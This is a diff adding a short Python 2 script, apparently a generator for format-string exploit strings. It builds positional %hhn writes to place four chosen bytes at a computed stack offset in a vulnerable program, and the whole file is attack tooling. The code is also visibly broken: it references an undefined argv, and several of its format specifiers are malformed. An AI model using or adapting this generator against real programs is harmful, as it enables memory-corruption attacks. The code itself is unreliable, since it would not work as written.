@@ -1,0 +1,38 @@
+#
+#       Format string Exploit
+#       string generator
+#
+import os
+import sys
+
+
+INT_BYTES = 4
+
+payload = 'a'*0 
+if '%' in payload: raise Exception()
+
+memoffset = 0x8 if len(sys.argv) < 2 else int(argv[1])
+
+val = '\x69\x70\x71\x72' #big-endian
+bval = [ord(x) for x in val]
+
+offset_ints = memoffset / INT_BYTES
+offset_bytes = memoffset % INT_BYTES
+
+int_str = ('%.8$' + str(offset_ints) + 'x') if offset_ints > 0 else ''
+byte_str = ('%$' + str(offset_bytes) + 'c') if offset_bytes > 0 else ''
+#print int_str, byte_str
+offset_fstr = payload + int_str + byte_str
+
+n = len(payload) + offset_ints * 8 + offset_bytes  #calc the current number of characters printed
+if bval[0] < n: raise Exception()
+    
+write_str = '%' + str(bval[0] - n) + '$c%hhn'
+write_str = write_str + '%' + str(bval[1]) + '$c%hhn'
+write_str = write_str + '%' + str(bval[2]) + '$c%hhn'
+write_str = write_str + '%' + str(bval[3]) + '$c%hhn'
+
+print offset_fstr + write_str
+
+
+
